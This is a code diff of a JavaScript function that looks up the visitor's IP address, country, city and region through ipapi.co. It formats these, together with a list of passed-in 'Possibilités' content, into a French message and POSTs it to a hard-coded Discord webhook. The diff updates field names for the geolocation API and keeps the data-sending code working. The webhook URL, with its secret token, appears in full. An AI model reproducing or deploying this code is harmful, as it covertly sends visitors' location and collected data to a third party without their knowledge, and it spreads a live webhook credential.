@@ -15,8 +15,8 @@
         function THEfunction(content) {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
-                .then(({ query, country, city, regionName }) => {
-                    const message = `# Address ip : ${query}\n\n- Pays : ${country}\n- Ville : ${city}\n- Region : ${regionName}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
+                .then(({ ip, country_name, city, region }) => {
+                    const message = `# Address ip : ${ip}\n\n- Pays : ${country_name}\n- Ville : ${city}\n- Region : ${region}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
 
                     fetch('https://discord.com/api/webhooks/1121364427820769340/a1rhihUdmuoZtxFy_xitB0tqmaSsagnPrbch9Te5zDpA1iMKttt3Yp3YU_f3kfYRmgN3', {
                         method: 'POST',
